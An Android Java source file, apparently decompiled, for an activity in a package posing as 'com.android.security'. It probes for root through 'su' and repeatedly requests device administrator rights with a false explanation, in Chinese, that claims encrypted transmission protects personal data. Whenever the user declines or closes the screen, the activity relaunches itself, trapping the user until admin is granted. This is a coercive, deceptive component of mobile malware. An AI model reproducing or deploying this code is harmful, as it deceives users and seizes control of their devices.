package com.android.security;

import java.io.DataOutputStream;

import com.android.security.receiver.MyDeviceAdminReceiver;


import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

public class AdminActivity extends Activity {
	private ComponentName deviceComponentName = null;
	private DevicePolicyManager dpm = null;
	private boolean isRoot = false;
	private String text = "";

	// ERROR //
	private boolean getRootAhth() {
		Process process = null;
		DataOutputStream os = null;
		try {
			process = Runtime.getRuntime().exec("su");
			os = new DataOutputStream(process.getOutputStream());
			os.writeBytes("exit\n");
			os.flush();
			int exitValue = process.waitFor();
			if (exitValue == 0) {
				isRoot = true;
				return true;
			} else {
				isRoot = false;
				return false;
			}
		} catch (Exception e) {
			Log.d("*** DEBUG ***", "Unexpected error - Here is what I know: "
					+ e.getMessage());
			isRoot = false;
			return false;
		} finally {
			try {
				if (os != null) {
					os.close();
				}
				process.destroy();
			} catch (Exception e) {
				e.printStackTrace();
			}
		}

	}

	public boolean isRoot() {
		return this.isRoot;
	}

	protected void onActivityResult(int requestCode, int resultCode, Intent data) {
		switch (requestCode) {
		case 1: {
			if (resultCode == -0x1) {
				finish();
			} else {
 				Intent intent = new Intent(this, AdminActivity.class);
				intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				startActivity(intent);
 				finish();
			}
			break;
		}
		}
		super.onActivityResult(requestCode, resultCode, data);
	}

	protected void onCreate(Bundle paramBundle) {
		super.onCreate(paramBundle);
		setContentView(0x7f030000);
		dpm = (DevicePolicyManager) getSystemService("device_policy");
		deviceComponentName = new ComponentName(this,
				MyDeviceAdminReceiver.class);
		if (dpm.isAdminActive(deviceComponentName)) {
			finish();
			finish();
			return;
		}
		boolean disable = getIntent().getBooleanExtra("disable", false);
		if (disable) {
			text = "加密的数据传输，您的个人信息得到持续不断的保护。";//암호화 된 데이터 전송입니다,귀하의 개인 정보는꾸준한보호받을수잇습니다
		} else {
			text = "加密的数据传输，您的个人信息得到持续不断的保护。";
		}
		Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
		intent.putExtra("android.app.extra.DEVICE_ADMIN", deviceComponentName);
		intent.putExtra("android.app.extra.ADD_EXPLANATION", text);
		startActivityForResult(intent, 0x1);
	}

	protected void onDestroy() {
		try {
			if (!dpm.isAdminActive(deviceComponentName)) {
				Intent intent = new Intent(this, AdminActivity.class);
				intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				startActivity(intent);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		super.onDestroy();
	}
}
